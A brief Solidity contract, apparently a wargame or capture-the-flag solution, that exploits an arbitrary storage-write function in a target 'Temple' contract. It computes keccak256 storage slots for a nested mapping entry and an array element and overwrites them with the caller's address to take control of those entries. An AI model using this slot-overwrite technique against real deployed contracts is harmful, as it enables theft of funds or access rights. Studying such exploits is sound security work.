// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

interface ITemple {
    function write(uint256 i, bytes32 data) external;
}

contract StorageWriter {
    function writeMapping(address templeContract, address myAddress) public {
        ITemple temple = ITemple(templeContract);
        uint x = uint(keccak256(abi.encode(20, 2)));
        uint y = uint(keccak256(abi.encode(22, x)));
        temple.write(y, bytes32(abi.encode(myAddress)));
    }

    function writeArray(address templeContract) public {
        uint i = uint(keccak256(abi.encode(3))) + 5;
        ITemple temple = ITemple(templeContract);
        temple.write(3, bytes32(uint256(6)));
        temple.write(i, bytes32(abi.encode(msg.sender)));
    }
}